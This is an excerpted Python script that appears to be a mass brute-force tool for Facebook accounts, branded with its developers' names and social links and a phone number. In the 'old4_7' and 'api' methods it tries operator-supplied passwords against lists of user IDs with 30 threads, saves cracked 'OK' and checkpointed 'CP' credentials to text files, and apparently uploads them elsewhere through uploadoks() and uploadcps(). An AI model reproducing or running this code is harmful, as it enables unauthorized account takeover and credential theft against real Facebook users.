...
def helpnote():
	print("%s [*] Subscribe ME ON Yt TU KNOW ABOUT UPDATES  :)"%(G))
	subprocess.check_output(["am", "start", "https://www.facebook.com/4FR1D1.143"])
	exit(" [*] Youtube:  https://youtube.com/channel/UCI2A0fpKv3-Dqg4BIGTmhUw")
...
def notice():
	...
	runtxt("\033[0;92m ADMIN FACEBOOK >> Snigdho")
	subprocess.check_output(["am", "start", "https://www.facebook.com/devilsnigdho.00"])
...
class Main:
	def __init__(self):
		...
		self.loop = 0
		try:
			plr = requests.get('https://justpaste.it/8eobi').text
			if basesplit in plr:
				key = basesplit
...
\033[1;97m••••••••••••••••••••••••••••••••••••••••••••••••••••••••
     \033[1;92m➣ \033[1;92mDEVOLPER   :            AHMED NAYEM
     \033[1;91m➣ \033[1;92mFACEBOOK   :            Ahmed Nayem 
     \033[1;93m➣ \033[1;92mWHATSAPP   :            01706167094
     \033[1;96m➣ \033[1;92mGITHUB     :            king-Nayem
...
\033[1;97m••••••••••••••••••••••••••••••••••••••••••••••••••••••••
	...
	def old4_7(self):
		...
		try:
			...
			print("\033[0;93m [+] TOTAL ID -> \033[0;91m%s\033[0;97m"%(len(self.id))) 
			with ThreadPoolExecutor(max_workers=30) as coeg:
				print("\n%s [!] USE %s, %s(COMMA)%s FOR NAYEM  "%(Y,G,B,Y))
				print("%s EXAMPLE : %s123456,1234567,123456789"%(Y,G))
				listpass = input("%s [?] ENTER PASSWORD :%s "%(Y,G))
				if len(listpass)<=5:
					exit("\n%s [!] PASSWORD MINIMUM 6 CHARACTERS"%(R))
	...
	def email(self):
		x = 111
		xx = 999
		nam = input("%s [?] TYPE A NAME %s(EX:Naiem ): "%(Y,G))
		nam = nam.replace(" ", "")
	...
	def api(self, uid, pwx):
		...
		sys.stdout.write(
			"\r\r %s\033[0;93m[>_] [SNIGDHO] : \033[0;97m %s/%s -> \033[0;92m [SNIGDHO -OK:%s ]- \033[0;93m[SNIGDHO-CP:%s ]"%(B,self.loop, len(self.id), len(self.ok), len(self.cp))
		); sys.stdout.flush()
		for pw in pwx:
			pw = pw.lower()
			...
			if "session_key" in response.text and "EAAA" in response.text:
				print("\r \033[0;92m[NAYEM-OK] %s|%s\033[0;97m         "%(uid, pw))
				self.ok.append("%s|%s"%(uid, pw))
				open("ok.txt","a").write(" [NAYEM-OK] %s|%s\n"%(uid, pw))
				uploadoks()
				break
			elif "www.facebook.com" in response.json()["error_msg"]:
				print("\r \033[0;93m[NAYEM-CP] %s|%s\033[0;97m         "%(uid, pw))
				self.cp.append("%s|%s"%(uid, pw))
				open("cp.txt","a").write(" [NAYEM-CP] %s|%s\n"%(uid, pw))
				uploadcps()
				break
			else:
				continue
